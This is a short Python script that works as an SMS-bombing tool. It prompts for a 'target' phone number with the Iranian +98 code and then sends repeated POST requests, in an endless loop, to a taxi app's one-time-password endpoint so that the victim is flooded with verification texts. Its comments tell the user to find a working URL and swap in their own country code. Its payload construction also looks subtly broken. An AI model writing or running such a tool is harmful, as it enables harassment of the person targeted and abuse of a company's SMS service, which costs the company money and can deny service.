import requests,time

url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp' #You have to find a valid url
number = {f"cellphone":{input("Enter target:+98")}} #also this is my country international country calling phone code, you have to change it to yours
t = input("Enter delay value:")
i = 0
while True:
    send = requests.post(url,number)
    status = send.status_code
    if status == 200:
        i+=1
        print(f"{i} Done Successfully")
        time.sleep(int(t))
    else:
        print("Error")
